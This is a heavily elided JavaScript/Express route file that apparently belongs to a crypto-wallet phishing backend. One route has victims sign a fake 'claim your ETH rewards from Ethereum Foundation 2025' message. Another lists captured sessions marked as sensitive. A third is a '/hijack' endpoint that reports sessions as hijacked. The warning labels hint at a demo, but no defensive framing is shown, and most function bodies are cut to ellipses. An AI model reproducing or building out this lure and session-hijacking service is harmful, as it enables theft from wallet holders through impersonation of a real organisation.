...
export default function setupSessionsRoutes(app) {
  app.post('/sessions', async (req, res) => {
    ...
    try {
      const web3 = new Web3();
      const message = 'Sign this message to claim your ETH rewards from Ethereum Foundation 2025';
  ...
  app.get('/sessions', async (req, res) => {
    ...
    try {
      ...
      res.status(200).json({
        sessions,
        securityWarning: '⚠️ CONTAINS SENSITIVE DATA '
      });
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch sessions' });
    }
  ...
  app.post('/sessions/:walletAddress/hijack', async (req, res) => {
    ...
    try {
      ...
      res.status(200).json({
        message: 'Session hijacking attempted',
        result,
        securityWarning: '⚠️ SESSION HIJACKED',
        riskLevel: 'CRITICAL'
      });
